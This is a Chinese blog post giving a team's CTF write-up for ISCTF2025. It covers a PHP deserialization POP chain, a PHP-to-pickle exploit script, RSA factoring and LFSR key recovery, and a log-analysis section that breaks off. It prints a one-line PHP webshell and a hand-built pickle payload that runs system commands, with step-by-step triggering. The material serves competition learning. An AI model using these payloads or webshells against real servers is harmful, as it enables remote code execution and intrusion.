<!DOCTYPE HTML>
<html lang="zh-CN">


<head>
    <meta charset="utf-8">
    <meta name="keywords" content="ISCTF2025_writeup, 博客">
    <meta name="description" content="追求不凡，永不止步">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <!-- Global site tag (gtag.js) - Google Analytics -->


    <title>ISCTF2025_writeup | 持之以 恒的博客</title>
    <link rel="icon" type="image/png" href="/favicon.png">

    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
    <link rel="stylesheet" type="text/css" href="/css/matery.css">
    <link rel="stylesheet" type="text/css" href="/css/my.css">

    <script src="/libs/jquery/jquery.min.js"></script>

<meta name="generator" content="Hexo 8.1.1"></head>




<body>
    <header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <img src="https://img.cdn1.vip/i/695499951457a_1767152021.webp" class="logo-img" alt="LOGO">
                    
                    <span class="logo-span">持之以 恒的博客</span>
                </a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
<ul class="right nav-menu">
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/" class="waves-effect waves-light">
      
      <i class="fas fa-home" style="zoom: 0.6;"></i>
      
      <span>首页</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/tags" class="waves-effect waves-light">
      
      <i class="fas fa-tags" style="zoom: 0.6;"></i>
      
      <span>标签</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/categories" class="waves-effect waves-light">
      
      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
      
      <span>分类</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/archives" class="waves-effect waves-light">
      
      <i class="fas fa-archive" style="zoom: 0.6;"></i>
      
      <span>归档</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/about" class="waves-effect waves-light">
      
      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
      
      <span>关于</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/contact" class="waves-effect waves-light">
      
      <i class="fas fa-comments" style="zoom: 0.6;"></i>
      
      <span>留言板</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/friends" class="waves-effect waves-light">
      
      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
      
      <span>友情链接</span>
    </a>
    
  </li>
  
  <li>
    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
    </a>
  </li>
</ul>


<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <img src="https://img.cdn1.vip/i/695499951457a_1767152021.webp" class="logo-img circle responsive-img">
        
        <div class="logo-name">持之以 恒的博客</div>
        <div class="logo-desc">
            
            追求不凡，永不止步
            
        </div>
    </div>

    

    <ul class="menu-list mobile-menu-list">
        
        <li class="m-nav-item">
	  
		<a href="/" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-home"></i>
			
			首页
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/tags" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-tags"></i>
			
			标签
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/categories" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-bookmark"></i>
			
			分类
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/archives" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-archive"></i>
			
			归档
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/about" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-user-circle"></i>
			
			关于
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/contact" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-comments"></i>
			
			留言板
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/friends" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-address-book"></i>
			
			友情链接
		</a>
          
        </li>
        
        
        <li><div class="divider"></div></li>
        <li>
            <a href="https://github.com/cyh-32/cyh-32.github.io" class="waves-effect waves-light" target="_blank">
                <i class="fab fa-github-square fa-fw"></i>Fork Me
            </a>
        </li>
        
    </ul>
</div>


        </div>

        
            <style>
    .nav-transparent .github-corner {
        display: none !important;
    }

    .github-corner {
        position: absolute;
        z-index: 10;
        top: 0;
        right: 0;
        border: 0;
        transform: scale(1.1);
    }

    .github-corner svg {
        color: #0f9d58;
        fill: #fff;
        height: 64px;
        width: 64px;
    }

    .github-corner:hover .octo-arm {
        animation: a 0.56s ease-in-out;
    }

    .github-corner .octo-arm {
        animation: none;
    }

    @keyframes a {
        0%,
        to {
            transform: rotate(0);
        }
        20%,
        60% {
            transform: rotate(-25deg);
        }
        40%,
        80% {
            transform: rotate(10deg);
        }
    }
</style>

<a href="https://github.com/cyh-32/cyh-32.github.io" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
   data-tooltip="Fork Me" data-position="left" data-delay="50">
    <svg viewBox="0 0 250 250" aria-hidden="true">
        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
              fill="currentColor" class="octo-body"></path>
    </svg>
</a>
        
    </nav>

</header>

    



<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/9.jpg')">
    <div class="container" style="right: 0px;left: 0px;">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <h1 class="description center-align post-title">ISCTF2025_writeup</h1>
                </div>
            </div>
        </div>
    </div>
</div>




<main class="post-container content">

    
    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
<style>
    #articleContent h1::before,
    #articleContent h2::before,
    #articleContent h3::before,
    #articleContent h4::before,
    #articleContent h5::before,
    #articleContent h6::before {
        display: block;
        content: " ";
        height: 100px;
        margin-top: -100px;
        visibility: hidden;
    }

    #articleContent :focus {
        outline: none;
    }

    .toc-fixed {
        position: fixed;
        top: 64px;
    }

    .toc-widget {
        width: 345px;
        padding-left: 20px;
    }

    .toc-widget .toc-title {
        padding: 35px 0 15px 17px;
        font-size: 1.5rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    .toc-widget ol {
        padding: 0;
        list-style: none;
    }

    #toc-content {
        padding-bottom: 30px;
        overflow: auto;
    }

    #toc-content ol {
        padding-left: 10px;
    }

    #toc-content ol li {
        padding-left: 10px;
    }

    #toc-content .toc-link:hover {
        color: #42b983;
        font-weight: 700;
        text-decoration: underline;
    }

    #toc-content .toc-link::before {
        background-color: transparent;
        max-height: 25px;

        position: absolute;
        right: 23.5vw;
        display: block;
    }

    #toc-content .is-active-link {
        color: #42b983;
    }

    #floating-toc-btn {
        position: fixed;
        right: 15px;
        bottom: 76px;
        padding-top: 15px;
        margin-bottom: 0;
        z-index: 998;
    }

    #floating-toc-btn .btn-floating {
        width: 48px;
        height: 48px;
    }

    #floating-toc-btn .btn-floating i {
        line-height: 48px;
        font-size: 1.4rem;
    }
</style>
<div class="row">
    <div id="main-content" class="col s12 m12 l9">
        <!-- 文章内容详情 -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                          <div class="article-tag">
                            <span class="chip bg-color">无标签</span>
                          </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                </div>
            </div>

            <div class="post-info">
                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
                    2025-12-30
                </div>
                

                

                
                <div class="info-break-policy">
                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
                    10.4k
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
                    46 分
                </div>
                

                
                    <div id="busuanzi_container_page_pv" class="info-break-policy">
                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
                        <span id="busuanzi_value_page_pv"></span>
                    </div>
				
            </div>
        </div>
        <hr class="clearfix">

        

        
        <!-- 代码块折行 -->
        <style type="text/css">
            code[class*="language-"], pre[class*="language-"] { white-space: pre-wrap !important; }
        </style>
        

        <div class="card-content article-card-content">
            <div id="articleContent">
                <p>队伍名称：NISA_Shell_We_Dance?<br>队伍排名：总榜：104 新生榜：18<br>所属院校及赛道：福建师范大学 新生赛道  </p>
<p>在写这篇 writeup 之前，首先感谢 ISCTF 2025 的出题人们设计了这样有趣且富有挑战性的题目，也感谢赛场上与我一同奋战的队友们。通过这次比赛，我们不仅提升了技术水平，还锻炼了团队协作能力。以下是我们对 ISCTF 2025 的 writeup（已经过另外两名队友的同意），希望能为其他参赛者提供一些参考和帮助。  </p>
<span id="more"></span>
<h2 id="来签个到吧"><a href="#来签个到吧" class="headerlink" title="来签个到吧"></a>来签个到吧</h2><p>这是一个非常经典的 POP 链构造 (PHP Object Injection Property Oriented Programming) 题目。</p>
<ul>
<li>漏洞分析<br>结合提供的 index.php 和 classes.php，我们可以梳理出攻击路径：</li>
</ul>
<p>入口点 (index.php):  </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$s</span> = <span class="variable">$_POST</span>[<span class="string">&quot;shark&quot;</span>] ?? <span class="string">&#x27;喵喵喵?&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">str_starts_with</span>(<span class="variable">$s</span>, <span class="string">&quot;blueshark:&quot;</span>)) &#123;</span><br><span class="line">    <span class="variable">$ss</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$s</span>, <span class="title function_ invoke__">strlen</span>(<span class="string">&quot;blueshark:&quot;</span>));</span><br><span class="line">    <span class="variable">$o</span> = @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$ss</span>); <span class="comment">// 反序列化漏洞点</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>只要我们在 POST 请求的 shark 参数中，以 <code>blueshark:</code>开头，后面跟上序列化字符串，服务器就会执行反序列化。  </p>
<p>可用类 (classes.php):  </p>
<p>FileLogger 类:<br>__destruct() 方法会调用 <code>file_put_contents($this-&gt;logfile, $this-&gt;content, FILE_APPEND);</code>。<br>利用点: 这是一个任意文件写入漏洞。如果我们能控制 $logfile（文件名）和 $content（文件内容），我们就可以写入一个 WebShell（例如 shell.php）。  </p>
<p>ShitMountant 类:<br><code>fetch()</code>方法调用 <code>file_get_contents</code> 和 <code>$this-&gt;logger-&gt;write</code>。<br><code>__destruct()</code> 调用 <code>fetch()</code>。<br>分析: 虽然 ShitMountant 可以读取文件，但是 index.php 并没有回显 读取到的内容。它只是把内容读到了变量里，或者通过 Logger 写入日志。如果我们用它来读取 <code>/flag</code>，我们也看不到 flag。<br>结论: ShitMountant 是个干扰项（或者用于盲注&#x2F;SSRF），直接利用 FileLogger 写 Shell 拿 Flag 才是最快路径。  </p>
<ul>
<li>解题思路 (利用 FileLogger 写 Shell)<br>我们的目标是构造一个 FileLogger 对象，使其在销毁时生成一个木马文件。<br>目标文件 (logfile): <code>shell.php</code> (或者 <code>hack.php</code>)。<br>目标内容 (content): <code>&lt;?php eval($_POST[1]);?&gt;</code> (一句话木马)。</li>
</ul>
<h2 id="双生序列"><a href="#双生序列" class="headerlink" title="双生序列"></a>双生序列</h2><p>解题思路<br>利用 Writer 类：写入提供的 Pickle Payload 到 <code>/tmp/ssxl/write.bin</code>，并生成对应的签名文件（密钥默认为 kaqikaqi，这正好和 Payload 里的密钥匹配，以此绕过 Python 的 HMAC 校验）。<br>利用 Shark 类：写入序列化后的 Pytools 对象到 <code>/tmp/ssxl/run.bin</code>，这是后续 run.php 执行所需要的。<br>利用 Bridge 类：作为链的入口，它连接了 Writer 和 Shark。当 api.php 调用 $bridge-&gt;fetch() 时，它会先触发 Writer 写文件，然后返回 Shark 对象。<br>利用 <code>Shark::__toString：api.php</code> 会尝试输出 fetch 的结果，从而触发 Shark 的 __toString，进而将 Pytools 写入文件。<br>触发执行：访问 run.php，它读取 run.bin，反序列化出 Pytools 对象并执行。<br>攻击脚本 (PHP):</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="comment"># ==========================================</span></span><br><span class="line"><span class="comment"># 1. 强制构造 Linux (posix) Pickle Payload</span></span><br><span class="line"><span class="comment"># ==========================================</span></span><br><span class="line"><span class="comment"># 我们不使用 os.system，而是手动写由 Protocol 0 组成的字节流</span></span><br><span class="line"><span class="comment"># 这样可以确保无论你在 Windows 还是 Mac 上运行，生成的都是 &quot;posix.system&quot;</span></span><br><span class="line"><span class="comment"># 这里的 payload 含义是: posix.system(&quot;cat /flag &gt; /tmp/ssxl/outs.txt&quot;)</span></span><br><span class="line"></span><br><span class="line">linux_rce_bytes = <span class="string">b&quot;cposix\nsystem\n(Vcat /flag &gt; /tmp/ssxl/outs.txt\ntR.&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Set</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.secret = <span class="string">b&quot;kaqikaqi&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.payload = linux_rce_bytes</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成 Pickle 并转 Base64</span></span><br><span class="line">pickle_data = pickle.dumps(<span class="type">Set</span>())</span><br><span class="line">b64_str = base64.b64encode(pickle_data).decode()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[+] Generated Linux-Compatible Base64 (Length: <span class="subst">&#123;<span class="built_in">len</span>(b64_str)&#125;</span>)&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ==========================================</span></span><br><span class="line"><span class="comment"># 2. 自动组装 PHP Payload</span></span><br><span class="line"><span class="comment"># ==========================================</span></span><br><span class="line"><span class="comment"># 手动拼接 PHP 序列化字符串，避免 PHP 环境配置麻烦</span></span><br><span class="line"><span class="comment"># 同时也去掉了 private 属性，防止空字节问题</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造 Shark 部分: O:5:&quot;Shark&quot;:1:&#123;s:3:&quot;ser&quot;;s:18:&quot;O:7:&quot;Pytools&quot;:0:&#123;&#125;&quot;;&#125;</span></span><br><span class="line">shark_part = <span class="string">&#x27;O:5:&quot;Shark&quot;:1:&#123;s:3:&quot;ser&quot;;s:18:&quot;O:7:&quot;Pytools&quot;:0:&#123;&#125;&quot;;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造 Writer 部分: O:6:&quot;Writer&quot;:2:&#123;s:7:&quot;b64data&quot;;s:LENGTH:&quot;CONTENT&quot;;s:4:&quot;init&quot;;s:4:&quot;init&quot;;&#125;</span></span><br><span class="line">writer_part = <span class="string">f&#x27;O:6:&quot;Writer&quot;:2:&#123;&#123;s:7:&quot;b64data&quot;;s:<span class="subst">&#123;<span class="built_in">len</span>(b64_str)&#125;</span>:&quot;<span class="subst">&#123;b64_str&#125;</span>&quot;;s:4:&quot;init&quot;;s:4:&quot;init&quot;;&#125;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造 Bridge 部分</span></span><br><span class="line">final_payload = <span class="string">f&#x27;blueshark:O:6:&quot;Bridge&quot;:2:&#123;&#123;s:6:&quot;writer&quot;;<span class="subst">&#123;writer_part&#125;</span>s:5:&quot;shark&quot;;<span class="subst">&#123;shark_part&#125;</span>&#125;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n[+] 请直接复制下方整行字符串到 index.php 提交 (不要多复制空格):&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;-&quot;</span> * <span class="number">60</span>)</span><br><span class="line"><span class="built_in">print</span>(final_payload)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;-&quot;</span> * <span class="number">60</span>)</span><br></pre></td></tr></table></figure>

<p>操作步骤<br>生成 Payload: 运行上面的 PHP 脚本，复制输出的字符串（以 blueshark: 开头的那一串）。<br>注入数据库:<br>在题目的网页输入框中粘贴该字符串。<br>点击 “commit”。<br>你应该会看到 “save sucess”。<br>触发反序列化 (写入文件):<br>查看页面下方的 “Recent” 列表，找到你刚刚提交的那条记录的 ID (假设是 123)。<br>访问 URL: &#x2F;api.php?id&#x3D;123<br>原理: api.php 反序列化 Bridge -&gt; 触发 Writer (写入 Pickle) -&gt; 返回 Shark -&gt; 触发 __toString -&gt; 触发 Shark (写入 Pytools)。<br>页面应该显示 “喵喵喵!”。<br>获取 Flag:<br>点击页面上的 “喵喵喵” 按钮，或者直接访问 &#x2F;run.php?action&#x3D;run。<br>原理: run.php 读取 Shark 写入的 Pytools 对象 -&gt; 执行 Python 脚本 -&gt; Python 脚本加载 Writer 写入的 Pickle -&gt; 执行 cat &#x2F;flag -&gt;</p>
<p>然后获取flag  </p>
<h2 id="小蓝鲨的费马谜题"><a href="#小蓝鲨的费马谜题" class="headerlink" title="小蓝鲨的费马谜题"></a>小蓝鲨的费马谜题</h2><p>攻击方法： 我们只需要计算GCD(hint−2,n)。由于 n只有 p和 q两个因子，且 hint−2是P的倍数，这个最大公约数的结果不仅包含了 p，实际上通常直接等于 p。<br>一旦我们拿到了 p，就可以算出 q，进而算出私钥 d 并解密 flag。<br>脚本如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># 题目给出的 n 和 c</span></span><br><span class="line">n = <span class="number">16926747183730811445521182287631871095235807124637325096660759361996155369993998745638293862726267741890840654094794027600177564948819372030933079291097084177091863985749240756085243654442374722882507015343515827787141307909182820013354070321738405810257107651857739607060274549412692517140259717346170524920540888050323066988108836911975466603073034433831887208978130406742714302940264702874305095602623379177353873347208751721068498690917932776984190598143704567665475161453335629659200748786648288309401513856740323455946901312988841290917666732077747457081355853722832166331501779601157719722291598787710746917947</span></span><br><span class="line">c = <span class="number">7135669888508993283998887257526185813831780208680788333332044930342125381561919830084088631920301623909949443002073193381401761901398826719665411432016217400457613545308262831975564456231165114091904748808206330488231569773162745696602366468753664188261933014198218922459715972876740957260132243927549037840265753282534565674280908439875550179801788711737901632349136780584007599655055605772651127003711138512998683145763743839326460319440186099818507078433271291685194944254795690424327192625258701835654639832285402990995662846426561789508331799972329711410217802657682842382105869446853207634070295959281375484933</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 刚才脚本爆破出来的 p (Hint 13)</span></span><br><span class="line">p = <span class="number">123598810108223191678595737123772778844630215064002820305338893427708983045469952403683397913953718120695151358793148813540889659478471330180117646250073161663408336541470953255506590569305918418756769822199023697222924000869451811623347213265980868063025676171788114326810217962087651858127454074427834611547</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 修复报错的关键：明确定义 e</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">egcd</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        g, y, x = egcd(b % a, a)</span><br><span class="line">        <span class="keyword">return</span> (g, x - (b // a) * y, y)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">modinv</span>(<span class="params">a, m</span>):</span><br><span class="line">    g, x, y = egcd(a, m)</span><br><span class="line">    <span class="keyword">if</span> g != <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&#x27;modular inverse does not exist&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> x % m</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">long_to_bytes</span>(<span class="params">val</span>):</span><br><span class="line">    byte_len = (val.bit_length() + <span class="number">7</span>) // <span class="number">8</span></span><br><span class="line">    <span class="keyword">return</span> val.to_bytes(byte_len, <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Calculating q...&quot;</span>)</span><br><span class="line">    q = n // p</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 验证是否正确分解</span></span><br><span class="line">    <span class="keyword">if</span> p * q != n:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] Something is wrong, p * q != n&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Calculating private key d...&quot;</span>)</span><br><span class="line">    phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">    d = modinv(e, phi)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Decrypting flag...&quot;</span>)</span><br><span class="line">    m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        flag = long_to_bytes(m).decode()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span> + <span class="string">&quot;=&quot;</span>*<span class="number">50</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;FLAG: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">50</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> err:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[-] Decode error: <span class="subst">&#123;err&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Raw decrypted integer: <span class="subst">&#123;m&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="小蓝鲨的LFSR系统"><a href="#小蓝鲨的LFSR系统" class="headerlink" title="小蓝鲨的LFSR系统"></a>小蓝鲨的LFSR系统</h2><p>求解步骤：  </p>
<p>构建线性方程组：</p>
<p>系数矩阵 A 大小为 256×128，<code>A[t][i] = S_t[i]</code></p>
<p>右侧向量 b 大小为 256，b[t] &#x3D; y_t</p>
<p>在GF(2)上求解：<br>在模2的有限域上解线性方程组 A·mask &#x3D; b。由于是二元域，可以使用高斯消元法或专门的求解工具。</p>
<p>恢复密钥：</p>
<p>将求得的128位 mask 每8位一组转换为字节</p>
<p>得到16字节的密钥 key</p>
<p>解密密文：</p>
<p>将密钥 key 重复足够多次，生成与密文等长的密钥流</p>
<p>将密文与密钥流逐字节异或得到明文</p>
<p>实际计算：</p>
<p>按照上述思路编写代码求解，得到以下结果：</p>
<p>恢复的 mask 为：  </p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[1, 1, 1, 1, 0, 1, 0, 1, 0, 0, 0, 0, 1, 1, 0, 1, 0, 0, 0, 0, 1, 0, 1, 0, 0, 1, 0, 1, 1, 0, 0, 0, 0, 1, 0, 1, 0, 0, 1, 0, 1, 0, 0, 1, 1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 0, 1, 0, 1, 1, 1, 0, 0, 1, 1, 1, 0, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 1, 0, 1, 1, 1, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 1, 1, 1, 1, 1, 1, 0, 1, 0, 1, 1, 0, 0, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1, 1, 1, 1]</span><br></pre></td></tr></table></figure>

<p>转换为16字节的密钥 key：<code>f5 0d 0a 58 52 9a 48 b9 c6 72 bb 74 a5 3f 58 49</code></p>
<p>解密 ciphertext ‘4b3be165a0a0edd67ca8f143884826725107fd42d6a6’ 得到明文：ISCTF{LFSR_1s_s1mple_and_1nsecur3}</p>
<p>所以最终的 flag 是：ISCTF{LFSR_1s_s1mple_and_1nsecur3}</p>
<h2 id="abnormal-log"><a href="#abnormal-log" class="headerlink" title="abnormal log"></a>abnormal log</h2><p>第一步：日志结构分析<br>通过查看日志内容，发现以下几个关键信息类型：</p>
<p>时间戳和日志级别：如 <code>[2025-09-11 20:54:19] [INFO]</code><br>攻击者活动：如 “Attacker uploading segment X”（X从1到116）<br>随机数据注入：如 “Random data injected: …”<br>文件数据片段：如 “File data segment: [hex字符串]”<br>上传状态：如 “Uploaded data: …”</p>
<p>第二步：关键数据识别<br>通过模式识别，发现：</p>
<p>File data segment 后面的hex数据是加密的flag数据<br>共有116个segment，需要按顺序组合<br>每个segment对应一个hex字符串  </p>
<p>第三步：数据提取<br>提取所有hex数据：</p>
